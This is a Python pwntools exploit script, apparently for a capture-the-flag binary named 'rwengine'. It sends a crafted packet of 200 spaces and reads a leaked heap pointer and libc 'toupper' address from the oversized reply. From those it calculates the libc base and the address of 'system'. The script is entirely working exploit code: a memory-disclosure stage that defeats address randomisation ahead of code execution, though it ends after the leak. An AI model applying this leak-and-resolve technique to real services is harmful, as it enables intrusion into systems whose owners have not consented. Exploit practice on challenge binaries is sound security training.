from pwn import *
import struct

context.log_level = 'debug'

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Step 1: Leak heap page_ptr and libc toupper
# Send Command 0x10 with 200 spaces
spaces = b" " * 200
send_pkt(0x10, spaces)
status, resp = recv_pkt()

print(f"Response status: {status}, len: {len(resp)}")
print("Response hex:", resp.hex())

page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])

print(f"Leaked page_ptr: {hex(page_ptr)}")
print(f"Leaked toupper: {hex(toupper_addr)}")

libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
system_addr = libc_base + libc.symbols['system']

print(f"Calculated libc_base: {hex(libc_base)}")
print(f"Calculated system_addr: {hex(system_addr)}")

io.close()
